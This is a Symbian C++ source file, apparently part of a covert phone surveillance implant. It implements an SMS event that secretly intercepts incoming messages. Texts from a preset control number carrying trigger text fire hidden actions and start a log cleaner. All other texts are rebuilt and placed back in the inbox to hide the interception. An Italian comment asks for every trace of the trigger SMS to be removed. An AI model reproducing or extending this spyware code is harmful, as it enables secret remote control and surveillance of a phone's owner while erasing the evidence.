/*
 ============================================================================
 Name		: EventSms.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventSms implementation
 ============================================================================
 */

#include "EventSms.h"
#include <smut.h>
#include <txtfmlyr.h>
#include <txtrich.h>
#include <smuthdr.h>

#include "Json.h"

CEventSms::CEventSms(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Sms, aTriggerId)
	{
	// No implementation required
	}

CEventSms::~CEventSms()
	{
	__FLOG(_L("Destructor"));
	delete iLogCleaner;
	delete iSmsRecv;
	iSocketServ.Close();
	iFs.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CEventSms* CEventSms::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventSms* self = new (ELeave) CEventSms(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventSms* CEventSms::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventSms* self = CEventSms::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventSms::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventSms.txt");
	__FLOG(_L("-------------"));
		
	BaseConstructL(params);

	// Initializes File-Server session, Socket Server session and Sms Receiver
	//User::LeaveIfError(iFs.Connect());  //original MB
	//User::LeaveIfError(iSocketServ.Connect()); //original MB
	TInt fsErr = iFs.Connect();
	TInt socketErr = iSocketServ.Connect();
	
	if((fsErr == KErrNone) && (socketErr == KErrNone))
		{
		TRAPD(error,(iSmsRecv = CSmsReceiverSocket::NewL(*this, iFs, iSocketServ)));
		if(error != KErrNone)
			{
			iSmsRecv = NULL;
			}
		TRAPD(err,(iLogCleaner = CLogCleaner::NewL(iFs)));
		if(error != KErrNone)
			{
			iLogCleaner = NULL;
			}
		}
	
	// Parses the parameters...

	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve tel number
		rootObject->GetStringL(_L("number"),iSmsNumber);
		//retrieve text
		rootObject->GetStringL(_L("text"), iSmsText);
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iIter);
			else 
				iIter = -1;
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				rootObject->GetIntL(_L("delay"),iDelay);
			else 
				iDelay = -1;
			}
		else
			{
			iRepeatAction = -1;
			iIter = -1;
			iDelay = -1;
			}
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
						
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	}

void CEventSms::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
		
	iEnabled = ETrue;
	
	// Starts Hidden SMS Receiver and Log Cleaner
	if(iSmsRecv != NULL)
		iSmsRecv->StartReceivingL(iSmsText);
	if(iLogCleaner != NULL)
		iLogCleaner->StartCleaner(iSmsNumber);
	}

void CEventSms::StopEventL()
	{
	if(iSmsRecv != NULL)
		iSmsRecv->Cancel();
	if(iLogCleaner != NULL)
		iLogCleaner->Cancel();
	
	iEnabled = EFalse;
	}

// this is the original method from MB
/*
void CEventSms::IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TDesC& aData)
	{
	// Check the sender...
	TBool match = (aFromNumber.Compare(iSmsNumber) == 0);
	if (aFromNumber.Length() >= 7 && iSmsNumber.Length() >= 7)
		{
		match = (aFromNumber.Right(7).Compare(iSmsNumber.Right(7)) == 0);
		}
	
	// If the sender matches then trigger the Actions
	if (match)
		{
		SendActionTriggerToCoreL();
		return;
		}	
	
	// The sender doesn't match, insert the message in the Inbox
	SaveToInBoxL(aFromNumber, aData);
	}
*/

void CEventSms::IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TDesC& aData)
	{
	__FLOG(_L("IncomingSmsl()"));
	// Check the sender...
	TBool match = EFalse;
	if(aFromNumber.Length() <= iSmsNumber.Length())
		{
		if(iSmsNumber.Find(aFromNumber) != KErrNotFound)
			{
			match = ETrue;
			}
		}
	else
		{
		if(aFromNumber.Find(iSmsNumber) != KErrNotFound)
			{
				match = ETrue;
			}
		}
		
	// If the sender matches then trigger the Actions
	if (match)
		{
		__FLOG(_L("Sender match, trigger the action."));
		SendActionTriggerToCoreL();
		return;
		}	
	
	// The sender doesn't match, insert the message in the Inbox
	__FLOG(_L("Sender doesn't match, put into inbox"));
	SaveToInBoxL(aFromNumber, aData);
	}

void CEventSms::SaveToInBoxL(const TDesC& sender, const TDesC& msg)
{
	__FLOG(_L("SaveToInboxL()"));
	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
	CleanupStack::PushL(msvSession);

	// Crea un Header (hdr) ed un Body (richtext)
	CParaFormatLayer* paraLayer = CParaFormatLayer::NewL();
	CleanupStack::PushL(paraLayer);
	CCharFormatLayer* charLayer = CCharFormatLayer::NewL();
	CleanupStack::PushL(charLayer);
	CRichText* richtext = CRichText::NewL(paraLayer,charLayer);
	CleanupStack::PushL(richtext);
	richtext->InsertL(0, msg);  // *** Testo del Messaggio

	CSmsHeader* hdr = CSmsHeader::NewL(CSmsPDU::ESmsDeliver, *richtext);
	CleanupStack::PushL(hdr);

	hdr->SetFromAddressL(sender); // *** Numero Mittente

	// Indice
	TMsvEntry entryIdx;
	entryIdx.SetInPreparation(ETrue);
	entryIdx.SetSendingState(KMsvSendStateNotApplicable);
	entryIdx.SetVisible(EFalse);
	entryIdx.SetReadOnly(EFalse);
	entryIdx.SetUnread(ETrue);

	TSmsUtilities::PopulateMsgEntry(entryIdx, hdr->Message(), KMsvGlobalInBoxIndexEntryId);

	// Imposta il campo Data e Ora attuale
	TTime time;
	time.UniversalTime(); // il cell. aggiunge in automatico il daylight saving per formare HomeTime()
	CSmsDeliver& smsDeliver = static_cast<CSmsDeliver&>( hdr->Message().SmsPDU() );
	smsDeliver.SetServiceCenterTimeStamp(time); // Tempo Visualizzato

	// Crea una Entry nell'inbox usando Indice
	CMsvEntry* entry = msvSession->GetEntryL(KMsvGlobalInBoxIndexEntryId);
	CleanupStack::PushL(entry);
	entry->CreateL(entryIdx);
	CleanupStack::PopAndDestroy(entry); // entry

	// Apre la entry appena creata
	entry = msvSession->GetEntryL(entryIdx.Id());
	CleanupStack::PushL(entry);

	// *** Modifica lo store associato a questa Entry
	CMsvStore* store = entry->EditStoreL();
	CleanupStack::PushL(store);
	hdr->StoreL(*store);

	store->StoreBodyTextL(*richtext);
	store->CommitL();
	entryIdx.iSize = store->SizeL();
	CleanupStack::PopAndDestroy(); // store

	// *** Imposta il campo details di Indice (Mittente preso dalla rubrica)
	TBuf<KSmsDetailsLength> details;
	TInt err = TSmsUtilities::GetDetails(entry->Session().FileSession(), hdr->Message().ToFromAddress(), details);
	entryIdx.iDetails.Set(details);

	// *** Imposta il campo description di Indice (Preso dal messaggio)
	TBuf<KSmsDescriptionLength> description;
	err = TSmsUtilities::GetDescription(hdr->Message(), description);
	entryIdx.iDescription.Set(description);

	// Aggiorna Indice associato alla Entry
	entryIdx.SetReadOnly(ETrue);
	entryIdx.SetVisible(ETrue);
	entryIdx.SetInPreparation(EFalse);
	entry->ChangeL(entryIdx);
	CleanupStack::PopAndDestroy();	// entry
	CleanupStack::PopAndDestroy(4);	// hdr rich char para
	CleanupStack::PopAndDestroy(msvSession);	// aMsvSession
}

void CEventSms::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* /*aArg3*/)
	{
	
	}

/*
 L'EventSms, definito nel file di configurazione dal relativo EventId, triggera l'azione ad esso associata quando viene ricevuto un SMS da un numero prestabilito e contenente il testo prestabilito. Nel caso in cui l'SMS venga identificato come proveniente dal numero prestabilito e contenente il testo prestabilito, va cancellato e rimossa ogni traccia della sua ricezione (inclusa l'eventuale accensione dello schermo).
 Parametri

 L'evento riceve, tramite la propria EventStruct, almeno tre parametri:

 uNumLen
 E' un UINT e definisce la lunghezza del numero di telefono, in byte, incluso il NULL-terminatore. 
 wNumber
 E' un WCHAR ed e' valorizzato con il numero di telefono prestabilito. 
 uTextLen
 E' un UINT e definisce la lunghezza del testo da monitorare, in byte, incluso il NULL-terminatore. 
 wText
 (facoltativo) E' un WCHAR ed e' valorizzato con il testo del messaggio che dovra' trovarsi nell'SMS per triggerare l'azione. 
 */

